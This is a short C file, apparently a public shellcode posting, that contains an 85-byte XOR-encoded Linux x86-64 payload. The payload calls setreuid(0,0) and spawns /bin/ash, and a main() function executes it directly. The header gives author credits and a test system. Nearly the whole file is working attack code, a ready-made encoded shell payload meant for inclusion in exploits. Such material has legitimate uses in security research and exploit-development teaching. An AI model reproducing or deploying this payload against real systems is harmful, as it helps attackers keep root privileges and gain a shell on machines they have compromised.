/*
# Title: Linux x86-64 setreuid (0,0) & execve("/bin/ash",NULL,NULL) + XOR encoded - 85 bytes
# Author: egeektronic <info (at) egeektronic {dot} com>
# Twitter: @egeektronic
# Tested on: Slackware 13.37
# Thanks: Mark Loiseau, entropy [at] phiral.net and metasm developer
*/

unsigned char shellcode[] = 
"\x4d\x31\xc0\x41\xb1\x7f\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb"
"\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48"
"\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\x37\x4e\xbf\x37\xfc\xbf"
"\x0e\x37\x4e\x80\x37\x4e\x89\x70\x7a\x94\x6f\x37\x4e\xbf\x37"
"\xfc\xbf\x44\x20\x37\x4e\x89\x37\x4e\xad\x70\x7a\x97\x94\x80"
"\x80\x80\x50\x1d\x16\x11\x50\x1e\x0c\x17";
int main(void) { ((void (*)())shellcode)(); }